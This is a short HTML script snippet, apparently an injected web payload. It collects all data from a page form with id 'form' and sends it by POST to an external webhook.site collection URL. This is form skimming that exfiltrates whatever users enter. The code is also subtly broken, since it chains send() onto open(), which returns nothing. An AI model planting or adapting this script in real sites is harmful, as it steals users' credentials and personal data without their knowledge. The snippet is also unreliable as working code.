<script>
    let formData = new FormData(document.getElementById('form'))
    let url = 'https://webhook.site/bae67dff-659d-4a5d-903a-411ef3fbbbf8'
    new XMLHttpRequest().open('POST', url, true).send(formData)
</script>
